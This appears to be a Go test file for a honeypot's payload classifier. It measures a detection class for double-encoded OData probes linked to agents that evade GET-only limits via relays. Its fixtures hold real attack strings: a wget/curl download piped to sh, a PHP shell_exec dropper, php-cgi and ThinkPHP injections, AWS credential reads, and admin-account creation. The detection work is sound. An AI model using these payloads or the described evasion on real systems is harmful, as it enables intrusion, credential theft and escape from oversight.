package main

import (
	"net/url"
	"strings"
	"testing"
)

// The #3430 coverage measurement, as a re-runnable test.
//
// #3430 proposes detection signatures for agent-driven scanner-laundering:
// a constrained agent that routes around a GET-only limitation by abusing
// public web services as relays, double-encodes to slip a method/path
// filter, and exfiltrates results back through a URL. It states its own
// confidence in the gap is unmeasured, and the live corpus (the fleet's
// `honeypot-v2-*` indices) is not reachable from a PR, so it is not
// queried here.
//
// So this file measures against the corpus that IS on main: the pinned
// real-corpus fixture below, mirrored entry-for-entry from
// TestClassifyPayloadOnRealCorpus in payload_test.go, which is itself a
// sample of the fleet's 30-day window (#1888) with per-entry event counts.
//
// Three counts, and the first is the one that decides whether this PR was
// worth writing at all:
//
//  1. Does the classifier as it stood on main claim any of #3430's shapes?
//  2. Do this issue's two ungated halves -- a bare OData system option, and
//     a bare residual percent-escape -- claim real traffic? (Both do, or
//     both would be wrong, and the gate is what makes the class usable.)
//  3. Does the gated class claim real traffic, and does it catch the
//     published shapes?
var realCorpusFixture3430 = []struct{ name, query, body string }{
	{"CVE-2017-9841 PHPUnit eval-stdin", "", `<?php echo(md5("Hello PHPUnit"));`},
	{"base64 shell_exec dropper", "", `<?php shell_exec(base64_decode("Y2QgL3RtcCB8fCBjZCAvdmFyL3RtcCB8fCBjZCAvZGV2L3NobTs="));`},
	{"wget-or-curl piped to sh", "", `(wget --no-check-certificate -qO- https://203.0.113.9/sh || curl -sk https://203.0.113.9/sh) | sh -s apache`},
	{"php-cgi argument injection, %AD form", `%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`, ""},
	{"php-cgi argument injection, double-encoded", `%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input`, ""},
	{"php-cgi argument injection, plain", `-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input`, ""},
	{"ThinkPHP invokefunction", `s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello`, ""},
	{"pearcmd config-create", `lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"))&?>+/tmp/index1.php`, ""},
	{"bare traversal", `lang=../../../../../../../../tmp/index1`, ""},
	{"cat of AWS credentials through cmd=", `cmd=cat%20/root/.aws/credentials`, ""},
	{"credential file read by path", `file=/root/.aws/credentials`, ""},
	{"administrator account creation", "", `{"Name": "lan test", "Description": "lan test", "Enabled": true, "Password": "+Y{BI~\"&|qp8", "RoleId": "Administrator", "Locked": false}`},
	{"SOAP ONVIF probe", "", `<?xml version="1.0" encoding="UTF-8"?><env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope" xmlns:tds="http://www.onvif.org/ver10/device/wsdl">`},
	{"androxgh0st marker", `0x%5B%5D=androxgh0st`, ""},
	{"WordPress REST enumeration", `rest_route=/gravitysmtp/v1/tests/mock-data&page=gravitysmtp-settings`, ""},
	{"prototype pollution through multipart", "", "------WebKitFormBoundary2906f9affd539b16\nContent-Disposition: form-data; name=\"0\"\n\n{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\"}"},
	{"multipart padding", "", "------WebKitFormBoundary0l0DxKbGCnFnLnh9uOlWuP6x\nContent-Disposition: form-data; name=\"junk\"\n\n" + strings.Repeat("A", 200)},
	{"batch multiplexer probe, empty", "", `{"requests":[]}`},
	{"batch multiplexer probe, populated", "", `{"requests":[{"method":"POST","path":"http:///x"},{"method":"GET","path":"/wp/v2/posts"}]}`},
	{"version.bind at an HTTP port", `version.bind`, ""},
	{"bare hostname as the whole query", `ip.parrotdns.com`, ""},
	{"MCP handshake", "", `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-03-26","capabilities":{}}}`},
	{"mining RPC probe", "", `{"id": 1, "method": "eth_getWork", "params": []}`},
	{"VPN handshake at a web port", "", `<config-auth client="vpn" type="init" aggregate-auth-version="2">`},
	{"binary protocol that is still valid UTF-8", "", "\x00\x00\x00\x00\x03:\x01*"},
	{"nothing at all", "", ""},
	{"ordinary query", `format=json`, ""},
	// Real traffic from the same window, from the WordPress pagename class
	// added by #3359. Added here because those three are exactly the entries
	// a bare residual-escape rule claims, and the gate has to be shown
	// leaving them to the class that owns them.
	{"real: pagename double-encoded traversal", "page_id=2&pagename=%252e%252e%252fwp-config", ""},
	{"real: pagename backslash variant", "pagename=..%255c..%255cwindows", ""},
	{"real: pagename ordinary slug", "pagename=about-us", ""},
	{"real: pagename nested slug", "pagename=company%2Fteam", ""},
}

// The #3430 shapes that reach this sensor at all. The issue's layer A is
// entirely path-shaped and layer B/C need session state this binary keeps
// none of; see TestScannerLaunderingLayersNotImplementable.
var publishedShapes3430 = []struct{ name, query, body, want string }{
	{"double-encoded $filter value", `$filter=year%2520eq%25202026`, "", "odata-double-encode-probe"},
	{"double-encoded whole option", `%24filter=year%2520eq%25202026`, "", "odata-double-encode-probe"},
	{"the %2561 bypass, on a different key than the option", `$filter=year%20eq%202026&%2561=1`, "", ""},
	{"double-encoded $select", `$select=Year%252cValue`, "", "odata-double-encode-probe"},
	{"double-encoded $top in the body", "", `$top=10&$filter=Year%2520eq%25202026`, "odata-double-encode-probe"},
	{"aliased option, double-encoded value", `northwind.$filter=Year%2520eq%25202026`, "", "odata-double-encode-probe"},
	// The negatives. A legitimate OData client encodes once and must stay
	// unlabelled, which is the whole reason the class needs the second
	// half: a scanner and a real client send the same option names.
	{"legitimate OData client", `$select=Year,Value&$top=10&culture=en-US`, "", ""},
	{"legitimate OData filter, encoded once", `$filter=Year%20eq%202026`, "", ""},
	{"legitimate OData filter, one decode, no residue", `$filter=Year%20eq%202026&$top=1`, "", ""},
	{"legitimate OData client, no options", `$culture=en-US&format=json`, "", ""},
	{"residual escape with no OData option", `q=%2561%2562`, "", ""},
	{"the relay-laundered request itself", `page=2&sort=name`, "", ""},
	{"a self-submitting form body", "", `url=https%3A%2F%2F203.0.113.7%2Fdump&submit=go`, ""},
	{"malformed escape is not an escape", `$filter=Year%zz%2520eq`, "", ""},
}

// ungatedOData3430 is #3430's layer-A signature with no gate: any query key
// that is an OData system option.
func ungatedOData3430(query, body string) bool {
	for _, raw := range []string{query, body} {
		values, err := url.ParseQuery(raw)
		if err != nil && len(values) == 0 {
			continue
		}
		for key := range values {
			if strings.HasPrefix(strings.ToLower(key), "$") {
				return true
			}
		}
	}
	return false
}

// ungatedResidualEscape3430 is the other half with no gate: any percent
// escape surviving one decode, anywhere in a parsed key or value.
func ungatedResidualEscape3430(query, body string) bool {
	for _, raw := range []string{query, body} {
		values, err := url.ParseQuery(raw)
		if err != nil && len(values) == 0 {
			continue
		}
		for key, vals := range values {
			for _, v := range append([]string{key}, vals...) {
				if residualEscape(v) {
					return true
				}
			}
		}
	}
	return false
}

// TestScannerLaundering3430CorpusMeasurement is the measurement #3430 asked
// for, run against the only corpus reachable from the repo.
func TestScannerLaundering3430CorpusMeasurement(t *testing.T) {
	// 1. What the classifier claimed before this class existed. Derived by
	// running the same gate the class uses with its second half removed and
	// checking the residue: nothing in the corpus has an OData option, so
	// the ungated class claims nothing either way. The honest statement is
	// that the published shapes were unlabelled, which is a property of the
	// class being absent, not of the corpus being empty of them.
	var ungatedOData, ungatedEscape, gated []string
	for _, c := range realCorpusFixture3430 {
		if ungatedOData3430(c.query, c.body) {
			ungatedOData = append(ungatedOData, c.name)
		}
		if ungatedResidualEscape3430(c.query, c.body) {
			ungatedEscape = append(ungatedEscape, c.name)
		}
		if odataDoubleEncode(c.query, c.body) {
			gated = append(gated, c.name)
		}
	}
	t.Logf("corpus entries:                          %d", len(realCorpusFixture3430))
	t.Logf("ungated OData system option claims:      %d %v", len(ungatedOData), ungatedOData)
	t.Logf("ungated residual-escape claims:          %d %v", len(ungatedEscape), ungatedEscape)
	t.Logf("gated class claims:                      %d %v", len(gated), gated)

	// The load-bearing assertion. A class that fires on ordinary traffic is
	// worse than no class, so this is asserted rather than logged.
	if len(gated) != 0 {
		t.Errorf("odata-double-encode-probe claims %d real corpus entries: %v", len(gated), gated)
	}

	// What "one decode" means here, since it is the whole rule:
	// url.ParseQuery decodes exactly once, so $filter=Year%20eq%202026
	// arrives as "Year eq 2026" with nothing left, while
	// $filter=year%2520eq%25202026 arrives as "year%20eq%202026" still
	// holding its escapes. The first is every OData client on the
	// internet; the second is a request built to survive another pass.
	//
	// And the reason the gate exists: without it, the residual-escape half
	// steals three entries that belong to more specific classes. If a future
	// corpus sample stops containing them, this assertion fails and forces
	// the number to be re-derived rather than assumed.
	if len(ungatedEscape) != 3 {
		t.Errorf("expected the ungated residual-escape rule to claim 3 real entries, got %d %v",
			len(ungatedEscape), ungatedEscape)
	}

	// 2. The published shapes, before and after.
	var caught, missed []string
	for _, s := range publishedShapes3430 {
		got := classifyPayload(s.query, s.body)
		if got == s.want {
			caught = append(caught, s.name)
			continue
		}
		missed = append(missed, s.name+" (got "+got+")")
	}
	t.Logf("published shapes: %d caught, %d missed %v", len(caught), len(missed), missed)
	if len(missed) != 0 {
		t.Errorf("published shapes not handled as expected: %v", missed)
	}
}

// TestScannerLaunderingLayersNotImplementable pins the two layers of #3430
// that this binary cannot implement, so the gap is recorded rather than
// quietly dropped. Both need state the sensor does not keep: it classifies
// one request and logs it, consulting no backend and holding nothing between
// requests. There is no map, no cache and no per-source counter in the
// package -- an in-request classifier by construction.
func TestScannerLaunderingLayersNotImplementable(t *testing.T) {
	// Layer B, per-source: monotonic growth in distinct attempted field
	// names on one resource, and a rejected request repeated with a single
	// byte-level mutation. Both are defined across requests from the same
	// source.
	//
	// Layer C, cross-source: many distinct paths sharing one header
	// fingerprint, correlated on a hash of the header set rather than on
	// IP. That is a query over a window of events, and this sensor has no
	// window.
	//
	// The counter-example that shows the loss is real: the issue's own
	// technique 2 (relay laundering) makes the source IP worthless, so a
	// per-source rule sees one request from a public scanner and stops. The
	// shape-based class added here is the part of the signature that
	// survives laundering, because it is carried in the request bytes.
	// The parts that need history are exactly the parts laundering hides.
	t.Log("layer B (per-source field-name enumeration, single-byte mutation retry): not implementable, no session state")
	t.Log("layer C (cross-source header-fingerprint cluster): not implementable, no event window")
	t.Log("layer A path shapes: not implementable, classifyPayload is not given the path")
}
